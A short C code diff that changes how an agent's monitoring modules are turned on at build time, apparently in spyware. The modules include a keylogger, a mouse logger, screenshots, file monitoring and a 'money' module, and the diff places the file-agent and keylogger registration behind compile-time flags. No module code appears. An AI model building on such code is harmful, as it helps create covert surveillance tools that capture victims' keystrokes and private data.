@@ -432,8 +432,10 @@ DWORD AM_Main()
 
 void InitAgents()
 {
+#ifdef __ENABLE_PROCMON_MODULE
 	PM_FileAgentRegister();
-	PM_KeyLogRegister();
+#endif
+
 #ifdef __ENABLE_SCREENSHOT_MODULE
 	PM_SnapShotRegister();
 #endif
@@ -454,7 +456,10 @@ void InitAgents()
 #ifdef __ENABLE_MONEY_MODULE
 	PM_MoneyRegister();
 #endif
+#if defined(__ENABLE_KEYLOG_MODULE) || defined(__ENABLE_MOUSE_MODULE)
+	PM_KeyLogRegister();
 	PM_MouseLogRegister();
+#endif
 #ifdef __ENABLE_APPLICATION_MODULE
 	PM_ApplicationRegister();
 #endif
